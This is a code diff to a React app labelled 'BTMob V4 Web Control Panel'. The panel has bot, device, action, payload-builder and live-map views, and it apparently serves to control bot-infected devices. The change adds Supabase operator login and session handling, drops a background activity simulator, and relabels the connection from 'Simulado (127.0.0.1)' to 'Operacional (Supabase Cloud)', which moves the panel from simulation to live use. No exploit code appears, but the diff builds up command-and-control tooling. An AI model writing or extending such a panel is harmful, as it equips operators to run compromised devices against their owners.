@@ -1,15 +1,19 @@
 import { useState, useEffect } from 'react';
 import { StorageService } from './services/storage';
+import { supabase } from './services/supabaseClient';
 import type { Bot, ActionLog } from './types';
 import { Dashboard } from './components/Dashboard';
 import { DeviceList } from './components/DeviceList';
 import { ActionPanel } from './components/ActionPanel';
 import { PayloadBuilder } from './components/PayloadBuilder';
 import { LiveMap } from './components/LiveMap';
+import { Login } from './components/Login';
 
 type NavigationTab = 'dashboard' | 'bots' | 'map' | 'builder';
 
 function App() {
+  const [session, setSession] = useState<any>(null);
+  const [loadingSession, setLoadingSession] = useState(true);
   const [activeTab, setActiveTab] = useState<NavigationTab>('dashboard');
   const [selectedBotId, setSelectedBotId] = useState<string | null>(null);
   
@@ -27,26 +31,47 @@ function App() {
     return () => window.removeEventListener('resize', handleResize);
   }, []);
 
-  // Initialize and subscribe to state updates
+  // 1. Session verification
   useEffect(() => {
-    // Initial fetch
+    supabase.auth.getSession().then(({ data: { session } }) => {
+      setSession(session);
+      setLoadingSession(false);
+    });
+
+    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
+      setSession(session);
+    });
+
+    return () => {
+      subscription.unsubscribe();
+    };
+  }, []);
+
+  // 2. Initialize and subscribe to state updates when session is active
+  useEffect(() => {
+    if (!session) {
+      setBots([]);
+      setLogs([]);
+      return;
+    }
+
+    // Initialize backend fetches and subscriptions
+    StorageService.initialize();
+
+    // Bind state updates
     setBots(StorageService.getBots());
     setLogs(StorageService.getLogs());
 
-    // Subscription
     const unsubscribe = StorageService.subscribe(() => {
       setBots(StorageService.getBots());
       setLogs(StorageService.getLogs());
     });
 
-    // Start background activity simulator
-    const stopSimulator = StorageService.startSimulator();
-
     return () => {
       unsubscribe();
-      stopSimulator();
+      StorageService.cleanup();
     };
-  }, []);
+  }, [session]);
 
   const handleSelectBot = (botId: string) => {
     setSelectedBotId(botId);
@@ -58,6 +83,42 @@ function App() {
   };
 
   const activeBot = bots.find(b => b.id === selectedBotId);
+
+  // Show a dark stylized loader while inspecting credentials
+  if (loadingSession) {
+    return (
+      <div style={{
+        display: 'flex',
+        flexDirection: 'column',
+        alignItems: 'center',
+        justifyContent: 'center',
+        height: '100vh',
+        background: 'var(--bg-primary)',
+        color: 'var(--text-secondary)',
+        gap: '12px'
+      }}>
+        <div style={{
+          width: '28px',
+          height: '28px',
+          border: '2px solid rgba(139, 92, 246, 0.2)',
+          borderTopColor: 'var(--accent-purple)',
+          borderRadius: '50%',
+          animation: 'spin 0.8s linear infinite'
+        }} />
+        <span style={{ fontSize: '13px', letterSpacing: '0.5px' }}>Conectando à rede de controle...</span>
+        <style>{`
+          @keyframes spin {
+            to { transform: rotate(360deg); }
+          }
+        `}</style>
+      </div>
+    );
+  }
+
+  // Render operator Login page if no authenticated session is active
+  if (!session) {
+    return <Login />;
+  }
 
   return (
     <>
@@ -109,9 +170,18 @@ function App() {
           </button>
         </nav>
         
-        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-          <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--success)' }} />
-          <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Servidor Conectado</span>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+            <span style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--success)' }} />
+            <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Servidor Conectado</span>
+          </div>
+          <button 
+            className="btn btn-secondary" 
+            onClick={() => supabase.auth.signOut()}
+            style={{ padding: '4px 10px', minHeight: '30px', fontSize: '12px' }}
+          >
+            Sair 🚪
+          </button>
         </div>
       </header>
 
@@ -221,8 +291,8 @@ function App() {
         fontSize: '11px',
         color: 'var(--text-muted)'
       }} className="desktop-footer">
-        <span>BTMob V4 Web Control Panel • Refatorado com React & TypeScript</span>
-        <span>Status da Conexão: Simulado (127.0.0.1)</span>
+        <span>BTMob V4 Web Control Panel • Refatorado com React & Supabase</span>
+        <span>Status da Conexão: Operacional (Supabase Cloud)</span>
       </footer>
       <style>{`
         @media (min-width: 769px) {
